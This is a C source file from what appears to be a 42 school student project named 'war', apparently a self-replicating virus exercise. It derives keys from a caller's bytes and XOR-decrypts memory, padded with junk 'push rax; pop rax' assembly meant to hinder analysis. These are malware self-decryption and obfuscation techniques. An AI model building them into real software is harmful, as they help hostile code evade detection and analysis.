/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   misc.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/14 16:51:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/02 16:35:35 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void	update_one(t_key *key,  char *caller,  size_t size)
{
	key->one = 0;
	key->junk[0] = 13;
	key->junk[1] = 12;
	for (register size_t index = 0; index < size; index++)
	{
		__asm__ __volatile__ (
			"push rax;"
			"pop rax;"
			);

		key->one += caller[index];
		key->junk[index % 2] = index ^ key->one;

		__asm__ __volatile__ (
			"push rax;"
			"pop rax;"
			);

		key->one += caller[index] ^ (key->junk[index % 2] + 1);
		key->junk[index % 2] |= key->one;

		__asm__ __volatile__ (
			"push rax;"
			"pop rax;"
			);

		key->one += key->junk[index % 2];
	}
	key += 1;
}

void	update_two(t_key *key,  char *caller,  size_t size)
{
	key->two = 0;
	key->junk[0] = 13;
	key->junk[1] = 12;
	for (register size_t index = 0; index < size; index++)
	{
		__asm__ __volatile__ (
			"push rax;"
			"pop rax;"
			);

		key->two += caller[index];
		key->junk[index % 2] = index ^ key->two;

		__asm__ __volatile__ (
			"push rax;"
			"pop rax;"
			);

		key->two += caller[index] ^ (key->junk[index % 2] + 1);
		key->junk[index % 2] |= key->two;

		__asm__ __volatile__ (
			"push rax;"
			"pop rax;"
			);

		key->two += key->junk[index % 2];
	}
}

void	revert_one(t_key *key, char *ptr, size_t size)
{
	__asm__ __volatile__ (
		"push rax;"
		"pop rax;"
		);

	for (register size_t off = 0 ; off < size ; off++)
	{
		ptr[off] ^= key->one;
	}
	__asm__ __volatile__ (
		"push rax;"
		"pop rax;"
		);
}

void	revert_two(t_key *key, char *ptr, size_t size)
{
	__asm__ __volatile__ (
		"push rax;"
		"pop rax;"
		);

	for (register size_t off = 0 ; off < size ; off++)
	{
		ptr[off] ^= key->two;
	}

	__asm__ __volatile__ (
		"push rax;"
		"pop rax;"
		);
}
